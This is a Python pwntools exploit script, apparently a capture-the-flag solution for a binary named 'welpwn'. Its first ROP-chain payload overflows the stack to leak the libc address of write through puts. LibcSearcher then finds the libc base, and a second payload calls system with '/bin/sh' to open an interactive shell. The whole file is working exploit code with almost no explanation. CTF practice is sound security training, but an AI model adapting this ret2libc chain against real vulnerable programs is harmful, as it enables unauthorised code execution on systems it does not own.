import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./welpwn')
e = pwn.ELF('./welpwn')

main_addr = pwn.p64(0x4007cd)

puts_plt = pwn.p64(e.plt['puts'])
write_got = pwn.p64(e.got['write'])

pop_rdi_ret_addr = pwn.p64(0x4008a3)   # pop rdi ; ret
pop4_ret_addr = pwn.p64(0x40089c)    # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# ************************
# attention! \x00 cut off
# ************************

payload1 = b'A' * 16 + b'B' * 8 + pop4_ret_addr + pop_rdi_ret_addr + write_got + puts_plt + main_addr

p.recvline(b'Welcome to RCTF\n')
#pwn.gdb.attach(p)
p.sendline(payload1)

write_addr = p.recv()[25:33]
print(write_addr)
print(len(write_addr))

write_addr = pwn.u64(write_addr)

pwn.pause()

import LibcSearcher 

libc = LibcSearcher.LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = pwn.p64(libc_base + libc.dump('system'))
sh_addr = pwn.p64(libc_base + libc.dump('str_bin_sh'))

print(system_addr)
print(type(system_addr))

payload2 = b'A' * 16 + b'B' * 8 + pop4_ret_addr + pop_rdi_ret_addr + sh_addr + system_addr

p.sendline(payload2)
p.interactive()

